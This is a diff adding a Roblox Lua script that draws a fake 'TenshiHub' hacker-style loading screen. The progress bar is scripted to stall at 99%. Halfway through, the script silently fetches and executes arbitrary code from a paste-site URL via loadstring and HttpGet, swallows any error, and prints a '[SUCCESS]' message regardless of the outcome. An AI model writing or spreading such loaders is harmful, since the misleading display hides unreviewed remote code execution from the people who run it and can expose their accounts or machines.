@@ -1,0 +1,79 @@
+-- 🧪 TenshiHub Hacker Style Loading Screen (LocalScript Version)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TenshiHubLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Create background frame
+local background = Instance.new("Frame")
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BorderSizePixel = 0
+background.Parent = screenGui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "TenshiHub!"
+title.Font = Enum.Font.Code
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.TextSize = 36
+title.Position = UDim2.new(0.05, 0, 0.02, 0)
+title.Size = UDim2.new(0.9, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = background
+
+-- Terminal Text
+local terminal = Instance.new("TextLabel")
+terminal.Font = Enum.Font.Code
+terminal.TextColor3 = Color3.fromRGB(0, 255, 0)
+terminal.TextSize = 18
+terminal.BackgroundTransparency = 1
+terminal.TextXAlignment = Enum.TextXAlignment.Left
+terminal.TextYAlignment = Enum.TextYAlignment.Top
+terminal.Position = UDim2.new(0.05, 0, 0.12, 0)
+terminal.Size = UDim2.new(0.9, 0, 0.8, 0)
+terminal.Text = ""
+terminal.TextWrapped = true
+terminal.TextScaled = false
+terminal.Parent = background
+
+-- Fake loading logic
+local percent = 1
+local logs = {}
+local loadedUI = false
+
+local function addLog(message)
+    table.insert(logs, "[TenshiHub] " .. message)
+    terminal.Text = table.concat(logs, "\n")
+end
+
+-- Main loop: 1% to 99% in ~2 minutes
+spawn(function()
+    while percent <= 99 do
+        addLog("Loading... " .. percent .. "%")
+
+        -- At 50%, show UI
+        if percent == 50 and not loadedUI then
+            loadedUI = true
+            addLog("[NOTIFICATION] Side UI is loading...")
+            pcall(function()
+                loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
+            end)
+            addLog("[SUCCESS] Side UI loaded.")
+        end
+
+        percent += 1
+        wait(1.2) -- Adjusted for ~2 minutes total duration
+    end
+
+    -- Stuck at 99%
+    addLog("[WARNING] Stuck at 99%...")
+    addLog("[SYSTEM] Awaiting final modules...")
+end)
